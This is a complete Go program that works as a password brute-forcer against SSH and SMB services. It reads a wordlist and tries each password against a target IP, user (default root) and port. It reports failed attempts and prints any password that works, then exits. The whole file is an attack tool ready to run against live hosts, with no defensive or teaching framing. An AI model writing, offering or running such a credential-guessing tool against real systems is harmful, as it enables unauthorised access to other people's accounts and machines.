package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/stacktitan/smb/smb"
	"golang.org/x/crypto/ssh"
)

var (
	inittime     = time.Now()
	service      = flag.String("service", "smb", "smb or ssh")
	passwordFile = flag.String("file", "WordListFile.txt", "Wordlist file to use")
	ip           = flag.String("ip", "123.123.123.123", "IP address to brute force")
	port         = flag.Int("port", 445, "Port of server to attack")
	user         = flag.String("user", "root", "User to attempt attack on")
	domain       = flag.String("domain", "", "Domain target machine is on")
	timer        = flag.Duration("timer", 300*time.Millisecond, "Timeout between attempts")
)

type resp struct {
	Error error
	mu    sync.Mutex
}

type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
}

func newFileScanner() *fileScanner {
	return &fileScanner{}
}

func (f *fileScanner) Open(path string) (err error) {
	f.File, err = os.Open(path)
	return err
}

func (f *fileScanner) Close() error {
	return f.File.Close()
}

func (f *fileScanner) GetScan() *bufio.Scanner {
	if f.Scanner == nil {
		f.Scanner = bufio.NewScanner(f.File)
		f.Scanner.Split(bufio.ScanLines)
	}

	return f.Scanner
}

func sshdialer(password string) *resp {
	exitcode := &resp{}
	config := &ssh.ClientConfig{

		User:            *user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timer,
	}

	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
	if err != nil {
		fmt.Printf("\nFailed password: %s", password)
	} else {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Fprintf(color.Output, "\n%s", color.YellowString("###########################"))
		fmt.Fprintf(color.Output, "%s %s", color.RedString("\nPattern found: "), color.GreenString(password))
		fmt.Fprintf(color.Output, "\n%s", color.YellowString("###########################"))
		fmt.Printf("\nCompleted in %v seconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
	}

	exitcode.Error = err
	return exitcode
}

func smbdialer(password string) *resp {
	exitcode := &resp{}
	config := smb.Options{
		Host:        *ip,
		Port:        *port,
		User:        *user,
		Domain:      *domain,
		Workstation: "",
		Password:    password,
	}
	debug := false

	session, err := smb.NewSession(config, debug)
	defer session.Close()

	if session.IsAuthenticated {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Fprintf(color.Output, "\n%s", color.YellowString("###########################"))
		fmt.Fprintf(color.Output, "%s %s", color.RedString("\nPattern Found: "), color.GreenString(password))
		fmt.Fprintf(color.Output, "\n%s", color.YellowString("###########################"))
		fmt.Printf("\nCompleted in %v seconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
	} else {
		fmt.Printf("\nFailed password: %s", password)
	}

	exitcode.Error = err
	return exitcode
}

func printUsedValues() {
	fmt.Println("Service: ", *service)
	fmt.Println("File: ", *passwordFile)
	fmt.Println("IP: ", *ip)
	fmt.Println("Port: ", *port)
	fmt.Println("Domain: ", *domain)
	fmt.Println("User: ", *user)
	fmt.Println("Timer: ", *timer)
}

func main() {
	flag.Parse()
	printUsedValues()
	fscanner := newFileScanner()
	err := fscanner.Open(*passwordFile)
	if err != nil {
		fmt.Println("Error while opening password file: ", err.Error())
	}

	switch targetService := service; *targetService {
	case "ssh":
		scanner := fscanner.GetScan()
		for scanner.Scan() {
			password := scanner.Text()
			go func() {
				resp := sshdialer(password)
				resp.mu.Lock()
				if resp.Error == nil {
					fscanner.Close()
					resp.mu.Unlock()
					os.Exit(0)
				}
			}()
			time.Sleep(*timer)
		}
	case "smb":
		scanner := fscanner.GetScan()
		for scanner.Scan() {
			password := scanner.Text()
			go func() {
				resp := smbdialer(password)
				resp.mu.Lock()
				if resp.Error == nil {
					fscanner.Close()
					resp.mu.Unlock()
					os.Exit(0)
				}
			}()
			time.Sleep(*timer)
		}
	default:
		log.Fatalln("Please set service to either ssh or smb.")
	}

}
